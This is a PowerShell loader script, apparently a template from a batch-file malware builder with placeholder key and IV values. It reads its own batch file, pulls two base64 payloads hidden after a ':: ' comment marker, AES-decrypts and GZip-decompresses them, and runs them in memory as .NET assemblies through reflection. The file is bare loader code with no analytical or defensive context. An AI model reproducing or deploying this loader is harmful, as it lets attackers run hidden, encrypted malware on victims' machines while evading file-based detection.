function decrypt_function($param_var)
{
	$aes_var=[System.Security.Cryptography.Aes]::Create();
	$aes_var.Mode=[System.Security.Cryptography.CipherMode]::CBC;
	$aes_var.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7;
	$aes_var.Key=[System.Convert]::FromBase64String('DECRYPTION_KEY');
	$aes_var.IV=[System.Convert]::FromBase64String('DECRYPTION_IV');
	$decryptor_var=$aes_var.CreateDecryptor();
	$return_var=$decryptor_var.TransformFinalBlock($param_var, 0, $param_var.Length);
	$decryptor_var.Dispose();
	$aes_var.Dispose();
	$return_var;
}

function decompress_function($param_var)
{
	$msi_var=New-Object System.IO.MemoryStream(,$param_var);
	$mso_var=New-Object System.IO.MemoryStream;
	$gs_var=New-Object System.IO.Compression.GZipStream($msi_var, [IO.Compression.CompressionMode]::Decompress);
	$gs_var.CopyTo($mso_var);
	$gs_var.Dispose();
	$msi_var.Dispose();
	$mso_var.Dispose();
	$mso_var.ToArray();
}

function execute_function($param_var,$param2_var)
{
	$obfstep1_var=[System.Reflection.Assembly]::Load([byte[]]$param_var);
	$obfstep2_var=$obfstep1_var.EntryPoint;
	$obfstep2_var.Invoke($null, $param2_var);
}

$batPath_var = '%~f0';
$host.UI.RawUI.WindowTitle = $batPath_var;
$contents_var=[System.IO.File]::ReadAllText($batPath_var).Split([Environment]::NewLine);
foreach ($line_var in $contents_var) 
{
	if ($line_var.StartsWith(':: '))
	{
		$lastline_var=$line_var.Substring(3);
		break;
	}
}
$payloads_var=[string[]]$lastline_var.Split('\');
$payload1_var=decompress_function (decrypt_function ([Convert]::FromBase64String($payloads_var[0])));
$payload2_var=decompress_function (decrypt_function ([Convert]::FromBase64String($payloads_var[1])));
execute_function $payload1_var $null;
execute_function $payload2_var (,[string[]] ('%*'));